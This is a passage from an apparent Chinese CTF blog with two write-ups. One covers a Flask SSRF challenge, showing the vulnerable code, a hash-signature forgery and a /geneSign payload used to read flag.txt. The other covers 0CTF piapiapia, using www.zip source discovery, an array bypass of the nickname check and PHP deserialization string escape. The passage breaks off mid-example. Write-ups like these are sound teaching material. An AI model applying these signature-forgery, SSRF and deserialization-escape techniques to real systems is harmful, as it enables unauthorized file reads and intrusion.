class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span><span class="hljs-comment">#是一个简单的赋值函数</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<span class="hljs-comment">#如果没有该文件夹，则创立一个文件夹</span><br>            os.mkdir(self.sandbox)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>    result = &#123;&#125;<br>    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>    <span class="hljs-keyword">if</span> (self.checkSign()):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>            tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)   <span class="hljs-comment">#注意w，可以对result.txt文件进行修改</span><br>            resp = scan(self.param)<br>            <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">print</span> resp<br>                tmpfile.write(resp)<span class="hljs-comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br>                tmpfile.close()<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>            f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-comment">#打开方式为只读</span><br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<span class="hljs-comment">#读取result.txt中的数据</span><br>        <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>            result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>    <span class="hljs-keyword">return</span> result<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<span class="hljs-comment">#cookie传递action参数，对应不同的处理方式</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<span class="hljs-comment">#传递get方式的参数param</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<span class="hljs-comment">#cookie传递sign参数sign</span><br>    ip = request.remote_addr<span class="hljs-comment">#获取请求端的ip地址</span><br>    <span class="hljs-keyword">if</span>(waf(param)):<span class="hljs-comment">#调用waf函数进行过滤</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip) <span class="hljs-comment">#创建Task类对象</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<span class="hljs-comment">#以json的形式返回到客户端</span><br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<span class="hljs-comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><span class="hljs-comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><span class="hljs-comment">#将传入的字符串进行md5加密</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><span class="hljs-comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">9999</span>)<br></code></pre></td></tr></table></figure><p>代码审计：</p><h5 id="1-flask框架"><a href="#1-flask框架" class="headerlink" title="1.flask框架"></a>1.flask框架</h5><h5 id="2-De1ta和-geneSign"><a href="#2-De1ta和-geneSign" class="headerlink" title="2./De1ta和/geneSign"></a>2./De1ta和/geneSign</h5><h5 id="3-task类"><a href="#3-task类" class="headerlink" title="3.task类"></a>3.task类</h5><p>得到flag的大致思路有了：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">首先绕过<span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.checkSign</span>()，并且传入的<span class="hljs-selector-tag">action</span>需要同时包含<span class="hljs-selector-tag">scan</span>和<span class="hljs-selector-tag">read</span>，然后<span class="hljs-selector-tag">if</span> &quot;<span class="hljs-selector-tag">scan</span>&quot; <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.action</span>:执行将<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.txt</span>中的数据写入<span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.txt</span>中，继续<span class="hljs-selector-tag">if</span> &quot;<span class="hljs-selector-tag">read</span>&quot; <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.action</span>:执行读取<span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.txt</span>中的数据，并且放在 <span class="hljs-selector-tag">result</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;data&#x27;</span>]</span> 中 ， <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">json</span><span class="hljs-selector-class">.dumps</span>(<span class="hljs-selector-tag">task</span><span class="hljs-selector-class">.Exec</span>())   接着返回以<span class="hljs-selector-tag">json</span>的形式返回到客户端。<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span><br>        <span class="hljs-keyword">if</span> (getSign(<span class="hljs-keyword">self</span>.action, <span class="hljs-keyword">self</span>.param) == <span class="hljs-keyword">self</span>.sign)<span class="hljs-symbol">:</span><br>            <span class="hljs-keyword">return</span> True<br>        <span class="hljs-symbol">else:</span><br>            <span class="hljs-keyword">return</span> False<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span></span>:<span class="hljs-comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>需要满足函数</p><p>self.checkSign()</p><p>则需满足</p><p><strong>getSign(self.action, self.param) == self.sign，（而sign值通过cookie传值</strong>）</p><p>也就需要</p><p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p><p>=&gt;<strong>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest() == self.sign</strong></p><p>我们需要得到**secert_key + ‘flag.txtreadscan’**的哈希值</p><p>我们还不懂secret_key的值是多少，它只存在于服务端，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值</p><p>注意到/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + ‘flag.txtreadscan’</p><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/geneSign?<span class="hljs-attribute">param</span>=flag.txtread<br></code></pre></td></tr></table></figure><p><img src="/2021/08/18/2021/ctf/13/image-20210818205021931.png" alt="image-20210818205021931"></p><p>得到哈希值后，将flag.txt中的数据读入result.txt，然后读取result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)   <span class="hljs-comment">#注意w，可以对result.txt文件进行修改</span><br>              resp = scan(self.param)<br>              <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-keyword">print</span> resp<br>                  tmpfile.write(resp)<span class="hljs-comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br>                  tmpfile.close()<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-comment">#打开方式为只读</span><br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<span class="hljs-comment">#读取result.txt中的数据</span><br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br></code></pre></td></tr></table></figure><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>伪造cookie的值</p><p><img src="/2021/08/18/2021/ctf/13/image-20210818205732109.png" alt="image-20210818205732109"></p><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0CTF 2016 piapiapia</title>
      <link href="/2021/08/17/2021/ctf/12/"/>
      <url>/2021/08/17/2021/ctf/12/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul><li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li><li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li><li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p></li></ul><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img src="/2021/08/17/2021/ctf/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p><p>f12无发现</p><p>这时候请出dirsearch(记得调低线程，不然会漏掉<a href="http://www.zip/">www.zip</a>)</p><p><img src="/2021/08/17/2021/ctf/12/image-20210817201129087.png" alt="image-20210817201129087"></p><p>通过后台扫描我们有了register页面，也就是注册页面</p><p>还有<a href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p><p><img src="/2021/08/17/2021/ctf/12/image-20210817204317100.png" alt="image-20210817204317100"></p><p>注册后登录</p><p><img src="/2021/08/17/2021/ctf/12/image-20210817201432160.png" alt="image-20210817201432160"></p><p><img src="/2021/08/17/2021/ctf/12/image-20210817201501824.png" alt="image-20210817201501824"></p><p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p><p>结果本题核心不是，是前面扫出的<a href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; ?php<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br>$username = $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) | | strlen($_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br>$file = $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span> ($file[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> $file[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file($file[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>$profile[<span class="hljs-string">&#x27;phone&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;email&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;email&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;nickname&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>$user-&gt;update_profile($username, serialize($profile));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>? &gt;<br></code></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们已经登录了，非常容易地就满足了。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br></code></pre></td></tr></table></figure><p>几个变量值都为POST传参</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (!preg_match(&#x27;/^\d&#123;<span class="hljs-number">11</span>&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))<br>die(&#x27;Invalid phone&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>正则表达式判断是否为11位的数字电话号码</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) | | strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="hljs-number">10</span>)<br>die(&#x27;Invalid nickname&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里判断了nickname是否为字符还有长度是否超过10</p><p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p><p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br></code></pre></td></tr></table></figure><h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p><p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params">$username, $new_profile</span>) </span>&#123;<br>$username = <span class="hljs-built_in">parent</span>::filter($username);<br>$new_profile = <span class="hljs-built_in">parent</span>::filter($new_profile);<br><br>$where = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, $new_profile, $where);<br>&#125;<br></code></pre></td></tr></table></figure><p>  我们再继续追寻下去<br>filter()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>&#125;<br></code></pre></td></tr></table></figure><p>update()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$table, $key, $value, $where</span>) </span>&#123;<br>$sql = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query($sql);<br>&#125;<br></code></pre></td></tr></table></figure><p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p><h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul><li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;defg&#x27;</span>);<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">string</span>(49) &quot;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span 